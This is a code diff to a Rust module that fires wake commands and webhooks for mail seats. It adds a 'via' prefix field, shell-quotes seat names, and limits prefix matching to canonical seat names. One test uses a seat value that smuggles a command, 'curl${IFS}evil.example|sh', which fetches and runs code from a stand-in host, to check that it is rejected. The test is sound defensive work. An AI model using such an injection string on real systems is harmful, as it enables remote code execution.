@@ -19,7 +19,8 @@
 //! A key that ends in `-` is a prefix. Mail to a longer seat that starts
 //! with it uses that wake, so a run named `ljosbot-review-` plus its run
 //! id wakes the launcher. An exact key wins, and the longest prefix wins
-//! when several match. The envelope still names the run's seat.
+//! when several match. The envelope still names the run's seat and carries
+//! the matched prefix as `via`.
 
 use std::collections::BTreeMap;
 use std::io::Write;
@@ -184,6 +185,13 @@ pub fn set_webhook(
 pub fn clear(seat: &str) -> Result<String> {
     let mut table = load();
     if table.remove(seat).is_none() {
+        if let Some((key, _)) = resolve(&table, seat) {
+            if key != seat {
+                return Ok(format!(
+                    "wake {seat}: none set; matches {key}. clear {key} to remove it\n"
+                ));
+            }
+        }
         return Ok(format!("wake {seat}: none set\n"));
     }
     save(&table)?;
@@ -241,6 +249,10 @@ fn resolve<'a>(table: &'a BTreeMap<String, Wake>, seat: &str) -> Option<(&'a str
     if let Some((key, wake)) = table.get_key_value(seat) {
         return Some((key.as_str(), wake));
     }
+    // Prefix wakes are only for canonical run seats.
+    if super::seat_slug(seat) != seat {
+        return None;
+    }
     table
         .iter()
         .filter(|(key, _)| {
@@ -248,6 +260,35 @@ fn resolve<'a>(table: &'a BTreeMap<String, Wake>, seat: &str) -> Option<(&'a str
         })
         .max_by_key(|(key, _)| key.len())
         .map(|(key, wake)| (key.as_str(), wake))
+}
+
+/// The wake a delivered message runs. A prefix key itself is not a seat.
+fn resolve_delivery<'a>(
+    table: &'a BTreeMap<String, Wake>,
+    seat: &str,
+) -> Option<(&'a str, &'a Wake)> {
+    let (key, wake) = resolve(table, seat)?;
+    (key != seat || !is_prefix_key(key)).then_some((key, wake))
+}
+
+fn matched_prefix<'a>(key: &'a str, seat: &str) -> Option<&'a str> {
+    (key != seat && is_prefix_key(key)).then_some(key)
+}
+
+fn launcher_seat(key: &str) -> &str {
+    if is_prefix_key(key) {
+        key.strip_suffix('-').unwrap_or(key)
+    } else {
+        key
+    }
+}
+
+fn wake_target(seat: &str, key: &str) -> String {
+    if let Some(via) = matched_prefix(key, seat) {
+        format!("{} via {via} for {seat}", launcher_seat(via))
+    } else {
+        key.to_string()
+    }
 }
 
 fn log_path() -> PathBuf {
@@ -295,7 +336,10 @@ fn wake_bin() -> Option<String> {
 pub fn spawn(events: &[Event]) -> Vec<String> {
     let table = load();
     let mut woken = Vec::new();
-    for event in events.iter().filter(|e| resolve(&table, &e.seat).is_some()) {
+    for event in events {
+        let Some((key, _)) = resolve_delivery(&table, &event.seat) else {
+            continue;
+        };
         let Some(bin) = wake_bin() else {
             log(&format!("{}: no ljos to run the wake", event.seat));
             continue;
@@ -319,7 +363,7 @@ pub fn spawn(events: &[Event]) -> Vec<String> {
         // The detached run writes its outcome to the wake log itself, and
         // what it prints would only repeat it.
         match super::detach(&bin, &args, std::path::Path::new("/dev/null")) {
-            Ok(()) => woken.push(event.seat.clone()),
+            Ok(()) => woken.push(wake_target(&event.seat, key)),
             Err(e) => log(&format!("{}: the wake did not start: {e:#}", event.seat)),
         }
     }
@@ -336,7 +380,10 @@ pub fn envelope(event: &Event) -> serde_json::Value {
         "msg": event.msg,
         "issue": event.issue,
         "interrupt": event.interrupt,
-        "read": format!("LJOS_SEAT={} ljos inbox", event.seat),
+        "read": format!(
+            "LJOS_SEAT={} ljos inbox",
+            crate::tools::sh_quote(&event.seat)
+        ),
     })
 }
 
@@ -405,7 +452,7 @@ fn run_command(command: &str, event: &Event, timeout: Duration) -> Result<String
     }
 }
 
-fn post(url: &str, wake: &Wake, event: &Event) -> Result<String> {
+fn post(url: &str, wake: &Wake, event: &Event, via: Option<&str>) -> Result<String> {
     check_webhook(url)?;
     let agent = ureq::AgentBuilder::new()
         .timeout(Duration::from_secs(WEBHOOK_TIMEOUT_SECS))
@@ -415,7 +462,11 @@ fn post(url: &str, wake: &Wake, event: &Event) -> Result<String> {
         req = req.set("Authorization", &format!("Bearer {key}"));
     }
     let started = Instant::now();
-    let resp = req.send_string(&envelope(event).to_string()).map_err(|e| {
+    let mut envelope = envelope(event);
+    if let Some(via) = via {
+        envelope["via"] = serde_json::Value::String(via.to_string());
+    }
+    let resp = req.send_string(&envelope.to_string()).map_err(|e| {
         anyhow::anyhow!("POST {url}: {}", e.to_string().replace(url, "the webhook"))
     })?;
     Ok(format!(
@@ -435,30 +486,27 @@ fn post(url: &str, wake: &Wake, event: &Event) -> Result<String> {
 /// the post fails.
 pub fn fire(event: &Event) -> Result<String> {
     let table = load();
-    let Some((key, wake)) = resolve(&table, &event.seat) else {
+    let Some((key, wake)) = resolve_delivery(&table, &event.seat) else {
         bail!("wake: {} has no wake set", event.seat);
     };
-    let named = if key == event.seat {
-        event.seat.clone()
-    } else {
-        format!("{} via {key}", event.seat)
-    };
+    let via = matched_prefix(key, &event.seat);
+    let named = wake_target(&event.seat, key);
     let outcome = if let Some(command) = &wake.command {
         let timeout = Duration::from_secs(wake.timeout.unwrap_or(WAKE_TIMEOUT_SECS).max(1));
         run_command(command, event, timeout)
     } else if let Some(url) = &wake.webhook {
-        post(url, wake, event)
+        post(url, wake, event, via)
     } else {
         Err(anyhow::anyhow!("neither a command nor a webhook"))
     };
     match outcome {
         Ok(said) => {
             log(&format!("{named} {}: {said}", event.msg));
-            Ok(format!("wake {}: {said}\n", event.seat))
+            Ok(format!("wake {named}: {said}\n"))
         }
         Err(e) => {
             log(&format!("{named} {}: {e:#}", event.msg));
-            Err(e).context(format!("wake {}", event.seat))
+            Err(e).context(format!("wake {named}"))
         }
     }
 }
@@ -513,6 +561,7 @@ mod tests {
         assert_eq!(v["seat"], "grok");
         assert_eq!(v["msg"], "m1");
         assert_eq!(v["interrupt"], true);
+        assert_eq!(v["read"], "LJOS_SEAT='grok' ljos inbox");
         assert!(v.get("body").is_none() && v.get("text").is_none(), "{v}");
         assert!(check_webhook("http://example.com/hook").is_err());
         assert!(check_webhook("https://api2.cursor.sh/automations/webhook/x").is_ok());
@@ -593,6 +642,10 @@ mod tests {
         assert_eq!(
             matched(&review_only, "ljosbot-review-def"),
             Some("ljosbot-review-")
+        );
+        assert_eq!(
+            matched(&review_only, "ljosbot-review-x;curl${IFS}evil.example|sh"),
+            None
         );
         assert_eq!(matched(&review_only, "ljosbot-reviewer"), None);
         assert_eq!(matched(&review_only, "ljosbot-review"), None);
@@ -696,7 +749,7 @@ mod tests {
             set.contains("when mail reaches a seat that starts with it"),
             "{set}"
         );
-        for seat in ["ljosbot-reviewer", "ljosbot-review"] {
+        for seat in ["ljosbot-reviewer", "ljosbot-review", "ljosbot-review-"] {
             let missed = fire(&Event {
                 seat: seat.into(),
                 ..Event::default()
@@ -727,7 +780,9 @@ mod tests {
         };
         let said = fire(&run).expect("fire run");
         assert!(
-            said.starts_with("wake ljosbot-review-def: posted, 200"),
+            said.starts_with(
+                "wake ljosbot-review via ljosbot-review- for ljosbot-review-def: posted, 200"
+            ),
             "{said}"
         );
         let posted = review_rx
@@ -745,6 +800,8 @@ mod tests {
         assert_eq!(v["msg"], "m1");
         assert_eq!(v["issue"], "Software-d9n6");
         assert_eq!(v["interrupt"], true);
+        assert_eq!(v["read"], "LJOS_SEAT='ljosbot-review-def' ljos inbox");
+        assert_eq!(v["via"], "ljosbot-review-");
         assert!(v.get("body").is_none() && v.get("text").is_none(), "{v}");
         assert!(broad_rx.try_recv().is_err(), "a longer prefix lost");
 
@@ -755,7 +812,7 @@ mod tests {
         );
         let log = std::fs::read_to_string(log_path()).unwrap_or_default();
         assert!(
-            log.contains("ljosbot-review-def via ljosbot-review-"),
+            log.contains("ljosbot-review via ljosbot-review- for ljosbot-review-def"),
             "{log}"
         );
 
@@ -767,7 +824,7 @@ mod tests {
         })
         .expect("fire broad");
         assert!(
-            other.starts_with("wake ljosbot-fix-9: posted, 200"),
+            other.starts_with("wake ljosbot via ljosbot- for ljosbot-fix-9: posted, 200"),
             "{other}"
         );
         let posted = broad_rx
@@ -789,7 +846,9 @@ mod tests {
         let posted = exact_rx
             .recv_timeout(Duration::from_secs(3))
             .expect("exact hook");
-        assert_eq!(body_of(&posted)["seat"], "ljosbot-review-abc");
+        let v = body_of(&posted);
+        assert_eq!(v["seat"], "ljosbot-review-abc");
+        assert!(v.get("via").is_none(), "{v}");
         assert!(
             !posted.to_ascii_lowercase().contains("authorization:"),
             "{posted}"
@@ -801,6 +860,18 @@ mod tests {
         });
         let err = format!("{:#}", missed.expect_err("other-1 has no prefix"));
         assert!(err.contains("other-1 has no wake set"), "{err}");
+    }
+
+    #[test]
+    fn clear_names_the_prefix_when_the_seat_has_no_own_wake() {
+        let (_lock, _dir) = isolated();
+        set_webhook("ljosbot-review-", "http://127.0.0.1:9/hook", None, None).expect("set prefix");
+        let said = clear("ljosbot-review-abc").expect("clear");
+        assert!(
+            said.contains("matches ljosbot-review-")
+                && said.contains("clear ljosbot-review- to remove it"),
+            "{said}"
+        );
     }
 
     #[cfg(unix)]
@@ -836,7 +907,10 @@ mod tests {
         let woken = spawn(&[event("ljosbot-review-abc"), event("inky")]);
         assert_eq!(
             woken,
-            vec!["ljosbot-review-abc".to_string(), "inky".to_string()]
+            vec![
+                "ljosbot-review via ljosbot-review- for ljosbot-review-abc".to_string(),
+                "inky".to_string()
+            ]
         );
 
         let started = Instant::now();
